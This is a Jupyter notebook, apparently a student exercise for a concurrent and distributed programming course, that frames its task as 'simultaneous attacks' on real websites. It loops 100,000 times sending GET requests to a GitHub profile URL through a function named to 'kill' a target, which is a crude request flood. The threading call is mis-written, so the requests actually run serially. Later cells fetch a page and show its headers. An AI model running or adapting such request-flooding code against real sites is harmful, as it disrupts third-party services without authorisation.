{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4af770f6-7e22-4cea-b29b-aecf92eef883",
   "metadata": {},
   "source": [
    "<!-- PROFILE LINK -->\n",
    "\n",
    "<h1 style = \"text-align:center; font-size: 30px\">PROGRAMACIÓN CONCURRENTE Y DISTRIBUIDA</h1>\n",
    "<a href =\"https://github.com/Nico-j-j\">\n",
    "<img src=\"https://avatars.githubusercontent.com/u/55808829?s=400&v=4\" style=\"float:left;vertical-align:centre\" width=\"110\" height=\"110\" title = \"Nicole Jealid Kuylen Aranda 221A7495\">\n",
    "<a href =\"https://github.com/Nico-j-j?tab=repositories\">\n",
    "<img src=\"https://media-exp1.licdn.com/dms/image/C4D0BAQEu_Aa76fcmPw/company-logo_200_200/0/1630998679429?e=2159024400&v=beta&t=2feC9GG7RWCWizTqsK5HzDWB1TL2DOQuAVwnMf6FFvk\" title = \"M41\" alt=\"UE\" width=\"110\" height=\"110\" style=\"float:right;vertical-align:centre\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "907d55b3-6dad-4039-9212-e0fa516bffaf",
   "metadata": {},
   "source": [
    "## Se solicita realizar ataques simultáneos a los siguientes sitios web:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "4a8fa00b-ebcc-440a-8ae9-f05cab24f707",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os, platform, requests, json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "b4dc4ce5-f91b-4ff9-946b-e0a37485771b",
   "metadata": {},
   "outputs": [],
   "source": [
    "numero_de_veces_hasta_matar_uem = 100000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "1b424eac-868f-43c2-ab03-17dd6f07014d",
   "metadata": {},
   "outputs": [],
   "source": [
    "url_= \"https://github.com/sukuzhanay\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "be138faf-d17b-4627-a60f-ea3d4bb9bb75",
   "metadata": {},
   "source": [
    "## Http Códigos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "b17309b6-c537-4e01-8228-0a366d3c1dfe",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython import display\n",
    "display.Image(\"statuscode.png\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "ec144b6b-dbbe-45d6-86c1-0273ed1e2ce4",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_uem():\n",
    "    print(requests.get(url_))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dcfc9cd9-0473-4970-b9c0-335249c1eed9",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(numero_de_veces_hasta_matar_uem):\n",
    "    threading.Thread(target = matar_uem()).start() #Crea un hilo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "20ea81da-807c-4c9e-81bc-77b8e42704a9",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_=requests.get(\"https://rpubs.com/christian_sucuzhanay\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "e3ea30d2-ace6-48c9-b486-bdd66021f6f0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Thu, 06 Oct 2022 16:29:39 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Status': '200 OK', 'Cache-Control': 'max-age=0, private, must-revalidate', 'Referrer-Policy': 'strict-origin-when-cross-origin', 'X-Permitted-Cross-Domain-Policies': 'none', 'X-XSS-Protection': '1; mode=block', 'X-Request-Id': '16b8223c-0f5d-4831-9233-904eebfb9e46', 'X-Download-Options': 'noopen', 'ETag': 'W/\"a5256cdddc27177505fec03be2774939\"', 'X-Frame-Options': 'SAMEORIGIN', 'X-Runtime': '0.040864', 'X-Content-Type-Options': 'nosniff', 'Set-Cookie': '_session_id=436fe233f6251ab17cc8f4ff07267486; path=/; HttpOnly', 'X-Powered-By': 'Phusion Passenger 6.0.2', 'Server': 'nginx/1.14.0 + Phusion Passenger 6.0.2', 'Content-Encoding': 'gzip'}"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res_.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "71065ff5-3576-4664-83ad-565d87a580d5",
   "metadata": {},
   "outputs": [],
   "source": [
    "html = res_.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9177915a-d5fd-4136-ade7-10925e40fc1b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
